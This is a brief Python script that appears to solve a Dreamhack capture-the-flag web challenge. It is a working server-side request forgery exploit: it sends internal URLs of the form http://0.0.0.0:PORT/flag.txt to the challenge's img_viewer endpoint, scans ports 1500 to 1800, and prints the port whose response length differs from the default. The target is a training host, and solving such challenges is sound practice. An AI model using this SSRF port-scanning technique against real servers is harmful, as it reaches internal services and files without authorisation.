import requests

url = "http://host3.dreamhack.games:20966/img_viewer"
for i in range(1500,1801):
    response = requests.post(url, data={'url':'http://0.0.0.0:'+str(i)+'/flag.txt'})
    data = response.text
    if len(data) != 65121:
        print('http://0.0.0.0:'+str(i)+'/flag.txt')
        break
